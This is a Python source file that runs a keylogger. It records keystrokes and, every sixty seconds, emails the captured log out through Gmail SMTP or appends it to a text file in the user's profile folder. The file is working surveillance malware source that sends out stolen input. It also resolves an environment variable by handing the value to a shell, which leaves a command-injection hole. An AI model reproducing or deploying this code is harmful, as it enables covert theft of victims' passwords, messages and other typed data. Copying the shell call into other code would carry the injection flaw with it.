import os
import sys
import time
import subprocess
import smtplib
from src.keylogger import Keylogger

# add parent director to the system path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

def get_env_var(var):
    """
    function to get envrionment variable value
    """
    command = subprocess.Popen(f"echo {var}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    return command.stdout.read().decode("utf-8").strip().replace("\\", "/")

def save_text_locally(text, file_path):
    """
    function to save text to the local file
    """
    try:
        # determine the mode; append if file exists, otherwise write
        mode = "a" if os.path.exists(file_path) else "w"
        with open(file_path, mode, encoding="utf-8") as file:
            if mode == "w":
                # add header with date
                file.write(f"{'-'*10}{time.strftime('%d/%m/%Y')} {time.strftime('%I:%M:%S')}{'-'*10}\n")
            file.write(text)
        return True
    except IOError:
        return False

def send_gmail(text, email, password):
    """
    function to send an email using Gmail
    """
    email_content = f"Subject: New Keylogger Logs\n\n{text}"
    try:
        # connect to the gmail SMTP server using SSL:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp_server:
            smtp_server.ehlo()
            # log in to the gmail account
            smtp_server.login(email, password)
            # send the email
            smtp_server.sendmail(email, email, email_content)
        return True
    except smtplib.SMTPResponseException:
        return False

class Main:
    """
    main class to handle keylogging and exporting logs
    """
    def __init__(self, timer, export_path="", gmail="", gmail_pass=""):
        self.gmail = gmail
        self.gmail_pass = gmail_pass
        self.keylogger = Keylogger()
        self.timer = timer
        # get the environment variable value for the export path
        self.export_path = get_env_var(export_path)

    def start(self):
        """
        start the keylogger and handle log exporting
        """
        self.keylogger.start()
        while True:
            # sleep for the specified time interval
            time.sleep(self.timer)

            # check if the keylogger is running
            if not self.keylogger.keylogger_running:
                break

            # get logged keys, encode to utf-8, and decode back
            key_log = self.keylogger.get_key_log().encode("utf-8", errors="replace").decode()

            if key_log:
                # if gmail credentials are provided, send the log through email
                if self.gmail:
                    if send_gmail(key_log, self.gmail, self.gmail_pass):
                        # clear the key log after sending
                        self.keylogger.clear_key_log()
                else:
                    # otherwise, save the log locally
                    if save_text_locally(key_log, self.export_path):
                        # clear the key log after saving
                        self.keylogger.clear_key_log()

if __name__ == "__main__":
    Main(60, "%userprofile%\\log.txt").start()